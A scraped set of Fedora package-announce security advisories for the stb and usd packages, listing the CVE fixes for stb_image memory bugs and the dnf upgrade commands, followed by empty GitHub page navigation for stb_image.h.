\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 0^20231011gitbeebb24-11
- stb\_image: fix GHSL-2023-151 / fix CVE-2023-45667
\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 0^20231011gitbeebb24-10
- stb\_image: fix GHSL-2023-150 / fix CVE-2023-45666
\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 0^20231011gitbeebb24-9
- Document another bug, PR, and name (GHSL-2023-149) for CVE-2023-43898
\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 0^20231011gitbeebb24-8
- stb\_image: fix GHSL-2023-148 / fix CVE-2023-45664
\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 0^20231011gitbeebb24-7
- stb\_image: fix GHSL-2023-147 / fix CVE-2023-45663
\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 0^20231011gitbeebb24-6
- stb\_image: fix GHSL-2023-146 / fix CVE-2023-45662
\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 0^20231011gitbeebb24-5
- stb\_image: fix GHSL-2023-145 / fix CVE-2023-45661
\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 0^20231011gitbeebb24-4
- Document that 1454.patch fixes CVE-2023-43898
\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 0^20231011gitbeebb24-3
- Backport a PR fixing undefined behavior in stb\_image\_resize2
\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 0^20231011gitbeebb24-2
- Backport three PR���s fixing undefined behavior in stb\_image
\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 0^20231011gitbeebb24-1
- Update to 0^beebb24git20231011 (minor C99 fixes)
--------------------------------------------------------------------------------
References:

[ 1 ] Bug #2246102 - CVE-2023-45661 stb: out of bounds read
<https://bugzilla.redhat.com/show_bug.cgi?id=2246102>
[ 2 ] Bug #2246103 - CVE-2023-45662 stb: out of bounds read
<https://bugzilla.redhat.com/show_bug.cgi?id=2246103>
[ 3 ] Bug #2246104 - CVE-2023-45663 stb: memory access violations
<https://bugzilla.redhat.com/show_bug.cgi?id=2246104>
[ 4 ] Bug #2246105 - CVE-2023-45664 stb: memory access violations
<https://bugzilla.redhat.com/show_bug.cgi?id=2246105>
[ 5 ] Bug #2246109 - CVE-2023-45666 stb: memory access violation
<https://bugzilla.redhat.com/show_bug.cgi?id=2246109>
[ 6 ] Bug #2246110 - CVE-2023-45667 stb: memory access violation
<https://bugzilla.redhat.com/show_bug.cgi?id=2246110>
[ 7 ] Bug #2246320 - CVE-2023-43281 stb: remote denial of service
<https://bugzilla.redhat.com/show_bug.cgi?id=2246320>
--------------------------------------------------------------------------------

This update can be installed with the "dnf" update program. Use
su -c 'dnf upgrade --advisory FEDORA-2023-d486d13cfd' at the command
line. For more information, refer to the dnf documentation available at
<http://dnf.readthedocs.io/en/latest/command_ref.html#upgrade-command-label>

All packages are signed with the Fedora Project GPG key. More details on the
GPG keys used by the Fedora Project can be found at
<https://fedoraproject.org/keys>
--------------------------------------------------------------------------------

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Back to the thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/NMXKOKPP4BKTNUTF5KSRDQAWOUILQZNO/#NMXKOKPP4BKTNUTF5KSRDQAWOUILQZNO)

[Back to the list](/archives/list/package-announce%40lists.fedoraproject.org/)

Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.7.



=== Content from lists.fedoraproject.org_51bcabd2_20250111_100629.html ===


[![Fedora Mailing-Lists](/static/logo-hyperkitty-fedora.png)](/archives/ "Fedora Mailing-Lists")

[Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/UVQ7ONFH5GWLMXYEAJG32A3EUKUCEVCR/)
[Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/UVQ7ONFH5GWLMXYEAJG32A3EUKUCEVCR/)

* [Sign In](/accounts/login/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/UVQ7ONFH5GWLMXYEAJG32A3EUKUCEVCR/)
* [Sign Up](/accounts/signup/?next=/archives/list/package-announce%40lists.fedoraproject.org/message/UVQ7ONFH5GWLMXYEAJG32A3EUKUCEVCR/)

* [Manage this list](/admin/lists/package-announce.lists.fedoraproject.org/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

### 2025

* [January](/archives/list/package-announce%40lists.fedoraproject.org/2025/1/)

### 2024

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2024/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2024/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2024/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2024/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2024/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2024/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2024/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2024/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2024/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2024/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2024/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2024/1/)

### 2023

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2023/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2023/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2023/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2023/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2023/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2023/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2023/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2023/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2023/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2023/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2023/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2023/1/)

### 2022

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2022/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2022/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2022/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2022/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2022/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2022/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2022/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2022/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2022/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2022/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2022/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2022/1/)

### 2021

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2021/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2021/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2021/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2021/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2021/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2021/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2021/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2021/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2021/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2021/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2021/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2021/1/)

### 2020

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2020/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2020/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2020/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2020/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2020/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2020/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2020/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2020/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2020/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2020/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2020/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2020/1/)

### 2019

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2019/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2019/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2019/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2019/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2019/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2019/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2019/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2019/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2019/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2019/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2019/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2019/1/)

### 2018

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2018/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2018/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2018/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2018/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2018/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2018/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2018/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2018/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2018/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2018/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2018/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2018/1/)

### 2017

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2017/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2017/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2017/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2017/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2017/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2017/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2017/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2017/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2017/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2017/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2017/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2017/1/)

### 2016

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2016/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2016/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2016/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2016/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2016/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2016/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2016/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2016/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2016/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2016/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2016/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2016/1/)

### 2015

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2015/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2015/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2015/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2015/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2015/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2015/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2015/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2015/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2015/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2015/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2015/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2015/1/)

### 2014

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2014/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2014/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2014/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2014/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2014/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2014/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2014/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2014/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2014/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2014/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2014/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2014/1/)

### 2013

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2013/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2013/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2013/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2013/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2013/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2013/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2013/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2013/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2013/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2013/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2013/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2013/1/)

### 2012

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2012/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2012/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2012/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2012/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2012/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2012/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2012/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2012/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2012/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2012/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2012/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2012/1/)

### 2011

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2011/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2011/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2011/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2011/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2011/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2011/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2011/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2011/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2011/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2011/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2011/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2011/1/)

### 2010

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2010/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2010/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2010/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2010/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2010/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2010/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2010/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2010/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2010/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2010/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2010/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2010/1/)

### 2009

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2009/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2009/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2009/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2009/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2009/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2009/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2009/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2009/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2009/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2009/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2009/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2009/1/)

### 2008

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2008/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2008/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2008/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2008/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2008/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2008/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2008/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2008/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2008/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2008/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2008/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2008/1/)

### 2007

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2007/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2007/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2007/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2007/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2007/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2007/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2007/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2007/5/)
* [April](/archives/list/package-announce%40lists.fedoraproject.org/2007/4/)
* [March](/archives/list/package-announce%40lists.fedoraproject.org/2007/3/)
* [February](/archives/list/package-announce%40lists.fedoraproject.org/2007/2/)
* [January](/archives/list/package-announce%40lists.fedoraproject.org/2007/1/)

### 2006

* [December](/archives/list/package-announce%40lists.fedoraproject.org/2006/12/)
* [November](/archives/list/package-announce%40lists.fedoraproject.org/2006/11/)
* [October](/archives/list/package-announce%40lists.fedoraproject.org/2006/10/)
* [September](/archives/list/package-announce%40lists.fedoraproject.org/2006/9/)
* [August](/archives/list/package-announce%40lists.fedoraproject.org/2006/8/)
* [July](/archives/list/package-announce%40lists.fedoraproject.org/2006/7/)
* [June](/archives/list/package-announce%40lists.fedoraproject.org/2006/6/)
* [May](/archives/list/package-announce%40lists.fedoraproject.org/2006/5/)

[List overview](/archives/list/package-announce%40lists.fedoraproject.org/)

[Download](/archives/list/package-announce%40lists.fedoraproject.org/export/package-announce%40lists.fedoraproject.org-UVQ7ONFH5GWLMXYEAJG32A3EUKUCEVCR.mbox.gz?message=UVQ7ONFH5GWLMXYEAJG32A3EUKUCEVCR "This message in gzipped mbox format")

[thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/UVQ7ONFH5GWLMXYEAJG32A3EUKUCEVCR/#UVQ7ONFH5GWLMXYEAJG32A3EUKUCEVCR)

# [SECURITY] Fedora 39 Update: usd-23.08-2.fc39

![](https://seccdn.libravatar.org/avatar/be256568dfce45c1862b55e6cf3f2726.jpg?s=120&d=retro&r=g)

[updates＠fedoraproject.org](/archives/users/3d8bb2e4c1d843beb492d4f8a7c44761/ "See the profile for updates＠fedoraproject.org")

3 Nov
2023

3 Nov
'23

7:06 p.m.

--------------------------------------------------------------------------------
Fedora Update Notification
FEDORA-2023-def2f95af4
2023-11-03 18:20:20.957605
--------------------------------------------------------------------------------

Name : usd
Product : Fedora 39
Version : 23.08
Release : 2.fc39
URL : <http://www.openusd.org/>
Summary : 3D VFX pipeline interchange file format
Description :
Universal Scene Description (USD) is a time-sampled scene
description for interchange between graphics applications.

--------------------------------------------------------------------------------
Update Information:

Security fix for CVE-2023-45661 CVE-2023-45662 CVE-2023-45663 CVE-2023-45664
CVE-2023-45666 CVE-2023-45667 CVE-2023-45675 CVE-2023-43281 ---- A new
parallel-installable stb\_image\_resize2 library is added
(stb\_image\_resize2-devel). It should provide significantly better performance;
the API is similar but not compatible. The original stb\_image\_resize library is
deprecated by the author, but will continue to be packaged as stb\_image\_resize-
devel for the foreseeable future.
--------------------------------------------------------------------------------
ChangeLog:

\* Wed Oct 25 2023 Benjamin A. Beasley code@musicinmybrain.net - 23.08-2
- Ensure stb\_image contains the latest CVE patches
--------------------------------------------------------------------------------
References:

[ 1 ] Bug #2246102 - CVE-2023-45661 stb: out of bounds read
<https://bugzilla.redhat.com/show_bug.cgi?id=2246102>
[ 2 ] Bug #2246103 - CVE-2023-45662 stb: out of bounds read
<https://bugzilla.redhat.com/show_bug.cgi?id=2246103>
[ 3 ] Bug #2246104 - CVE-2023-45663 stb: memory access violations
<https://bugzilla.redhat.com/show_bug.cgi?id=2246104>
[ 4 ] Bug #2246105 - CVE-2023-45664 stb: memory access violations
<https://bugzilla.redhat.com/show_bug.cgi?id=2246105>
[ 5 ] Bug #2246109 - CVE-2023-45666 stb: memory access violation
<https://bugzilla.redhat.com/show_bug.cgi?id=2246109>
[ 6 ] Bug #2246110 - CVE-2023-45667 stb: memory access violation
<https://bugzilla.redhat.com/show_bug.cgi?id=2246110>
[ 7 ] Bug #2246320 - CVE-2023-43281 stb: remote denial of service
<https://bugzilla.redhat.com/show_bug.cgi?id=2246320>
--------------------------------------------------------------------------------

This update can be installed with the "dnf" update program. Use
su -c 'dnf upgrade --advisory FEDORA-2023-def2f95af4' at the command
line. For more information, refer to the dnf documentation available at
<http://dnf.readthedocs.io/en/latest/command_ref.html#upgrade-command-label>

All packages are signed with the Fedora Project GPG key. More details on the
GPG keys used by the Fedora Project can be found at
<https://fedoraproject.org/keys>
--------------------------------------------------------------------------------

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Back to the thread](/archives/list/package-announce%40lists.fedoraproject.org/thread/UVQ7ONFH5GWLMXYEAJG32A3EUKUCEVCR/#UVQ7ONFH5GWLMXYEAJG32A3EUKUCEVCR)

[Back to the list](/archives/list/package-announce%40lists.fedoraproject.org/)

Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.7.



=== Content from github.com_eda71859_20250111_100626.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnothings%2Fstb%2Fblob%2F5736b15f7ea0ffb08dd38af21067c314d6a3aae9%2Fstb_image.h)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnothings%2Fstb%2Fblob%2F5736b15f7ea0ffb08dd38af21067c314d6a3aae9%2Fstb_image.h)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=nothings%2Fstb)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[nothings](/nothings)
/
**[stb](/nothings/stb)**
Public

* [Notifications](/login?return_to=%2Fnothings%2Fstb) You must be signed in to change notification settings
* [Fork
  7.7k](/login?return_to=%2Fnothings%2Fstb)
* [Star
   27.5k](/login?return_to=%2Fnothings%2Fstb)

* [Code](/nothings/stb)
* [Issues
  158](/nothings/stb/issues)
* [Pull requests
  131](/nothings/stb/pulls)
* [Discussions](/nothings/stb/discussions)
* [Actions](/nothings/stb/actions)
* [Projects
  0](/nothings/stb/projects)
* [Security](/nothings/stb/security)
* [Insights](/nothings/stb/pulse)

Additional navigation options

* [Code](/nothings/stb)
* [Issues](/nothings/stb/issues)
* [Pull requests](/nothings/stb/pulls)
* [Discussions](/nothings/stb/discussions)
* [Actions](/nothings/stb/actions)
* [Projects](/nothings/stb/projects)
* [Security](/nothings/stb/security)
* [Insights](/nothings/stb/pulse)

## Files

 5736b15
## Breadcrumbs

1. [stb](/nothings/stb/tree/5736b15f7ea0ffb08dd38af21067c314d6a3aae9)
/
# stb\_image.h

Copy path Blame  Blame
## Latest commit

## History

[History](/nothings/stb/commits/5736b15f7ea0ffb08dd38af21067c314d6a3aae9/stb_image.h)7987 lines (7103 loc) · 278 KB 5736b15
## Breadcrumbs

1. [stb](/nothings/stb/tree/5736b15f7ea0ffb08dd38af21067c314d6a3aae9)
/
# stb\_image.h

Top
## File metadata and controls

* Code
* Blame

